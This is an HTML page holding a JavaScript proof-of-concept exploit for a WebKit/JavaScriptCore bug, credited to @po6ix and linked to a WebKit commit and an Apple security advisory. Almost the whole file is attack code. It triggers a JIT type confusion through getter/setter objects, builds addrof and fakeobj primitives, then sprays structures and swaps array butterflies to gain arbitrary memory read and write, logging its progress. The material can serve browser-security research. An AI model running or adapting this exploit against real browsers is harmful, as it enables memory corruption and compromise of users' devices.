<!DOCTYPE html>
<html>
    <head>
        <style>
            body {
                font-family: 'Courier New', Courier, monospace;
                font-size: 4rem;
            }
        </style>
    </head>
<body>
<script src="util.js"></script>
<script src="int64.js"></script>
<script>
    /*
author: @po6ix
commit: https://github.com/WebKit/WebKit/commit/08d5d17c766ffc7ca6a7c833c5720eb71b427784
advisory: https://support.apple.com/en-us/HT213926
*/

let boxed_arr = new Function();
boxed_arr.p1 = 1.1;
boxed_arr[0] = {};

let getter = new Function();
getter.p1 = 1.1;
getter[0] = 1.1;

let shape = {};
for (let i = 0; i < 14; ++i) {
    shape['p'+i] = i;
}

let shapes = [];
for (let i = 0; i < 100; ++i) {
    shapes.push({
        ...shape,
        ['z'+i]: 0x1337
    });
}

function trigger(type) {
    let object_a = {};
    object_a.foo = 1;
    object_a.p1 = 1.1;

    let object_b = {};
    object_b.__defineGetter__('p1', getter);
    object_b.foo = 1;

    function get_getterSetter(type) {
        let o, retval;

        if (type == 0) o = object_a;
        else o = object_b;

        for (let i = 0; i < 2; ++i) {
            if (type == 0) retval = o.foo;
            else retval = o.foo;
        }
        return retval;
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }

    return [getter, get_getterSetter(1)];
}


(function pwn() {
    let [getter, getterSetter] = trigger();
    let success = false;
    try {
        getterSetter.toString();
    } catch(e) {
        // it should fail to call toString
        success = true;
    }
    if (!success) {
        alert('failed to get getterSetter');
        return;
    }

    let symbolObject = Object(getterSetter);

    let ref_arr = [];
    for (let i = 0; i < 87; ++i) {
        ref_arr.push(symbolObject.description);
    }

    getter.p13 = 1.1; // change the length of boxed_arr
    let unboxed_arr = getter;
    
    function addrof(o) {
        boxed_arr[8] = o;
        // return unboxed_arr[0];
        return Int64.fromDouble(unboxed_arr[0]);
    }

    function fakeobj(addr) {
        unboxed_arr[0] = addr.asDouble();
        // unboxed_arr[0] = addr;
        return boxed_arr[8];
    }
    
    function lol() {
        log("stage 2");
        // https://liveoverflow.com/preparing-for-stage-2-of-a-webkit-exploit/

        // The plan is to
        // 0. Create a lot of Structures for Float64Array instances
        // 1. Setup a fake Float64Array inside another object's inline properties.
        //    The data pointer points into a Uint8Array.
        // 2. Since we don't know the correct structure ID of a Float64Array instance,
        //    we find it using 'instanceof'.
        // 3. We now have an arbitrary read+write primitive since we control the data pointer
        //    of an Uint8Array.
        // 4. We need to fix up a few things so the garbage collector won't crash the process.

        // spray to increase rate of finding structure id
        var structure_spray = []; // arraywithcontiguous
        for(var i=0; i< 1000; i++) {
            var array = [13.37];
            array.a = 13.37;
            array['p'+i] = 13.37;
            structure_spray.push(array)
        }
        var victim = structure_spray[510]; // arraywithdoubles
        // u32[0] = 0x200; // Structure ID

        var flags_arr_double = 0x01082007 - 0x10000; // Flags for ArrayWithDoubles
        var flags_arr_contiguous = 0x01082009 - 0x10000;

        var outer = { // outer obj
            p0: 0,
            jsCellHeader: flags_arr_contiguous,
            butterfly: victim,
            p3: 0xfffffff,
        };
        log("please1");
        var hax = fakeobj(Add(addrof(outer), 16)); // fake obj. hax[0] has victim's cell header and hax[1] gives the victim's butterfly
        var unboxed = [13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37];
        // copyonwritearraywithdoubles convert to arraywithdoubles
        unboxed[0] = 4.2;
        var boxed = [{}]; // arraywithcontiguous
        log("please1");
        hax[1] = unboxed // 1. hax[1] butterfly object is now changed to unboxed's metadata
        var tmp_butterfly = victim[1]; // 2. save victim butterfly to tmp_butterfly
        hax[1] = boxed // 3 set hax[1] to boxed so that victim[1] now points to boxed's butterfly instead
        victim[1] = tmp_butterfly; // 4. set victim's butterfly to tmp_butterfly which is unboxed's butterfly
        // both point to the same butterfly now.
        log("please2");
        /* `addrof` */
        stage2_addrof = function(obj) {
            boxed[0] = obj;
            return unboxed[0];
        }
        // overwrite the old `addrof` with the new `stage2_addrof`
        addrof = stage2_addrof;

        /* fakeobj */
        stage2_fakeobj = function(addr) {
            unboxed[0] = addr;
            return boxed[0];
        }
        // overwrite the old `fakeobj` with the new `stage2_fakeobj`
        fakeobj = stage2_fakeobj;
        log("piss");
        testobject = {};
        testobject.a = 1;
        testobject.b = 2;
        testobject.c = 3;
        log("testobject2 addr: " + addrof(testobject).toString() + "<br>testobject2 properties: ");
        Object.values(testobject).forEach((prop)=> log(prop));
        testobjectfake = fakeobj(addrof(testobject));
        testobjectfake.b = "we out here";
        testobjectfake.c = 1337;
        log("<br>fake object addr: " + addrof(testobjectfake).toString() + "<br>fakeobject edited testobject properties:");
        Object.values(testobject).forEach((prop)=> log(prop));
        log("done");
    }

        log(`success!!!`);

        // testobject = {};
        // testobject.a = 1;
        // testobject.b = 2;
        // testobject.c = 3;
        // log("testobject addr: " + addrof(testobject).toString() + "<br>testobject properties: ");
        // Object.values(testobject).forEach((prop)=> log(prop));
        // testobjectfake = fakeobj(addrof(testobject));
        // testobjectfake.b = "we out here";
        // testobjectfake.c = 1337;
        // log("<br>fake object addr: " + addrof(testobjectfake).toString() + "<br>fakeobject edited testobject properties:");
        // Object.values(testobject).forEach((prop)=> log(prop));
        lol();
})();
</script>

</body>
</html>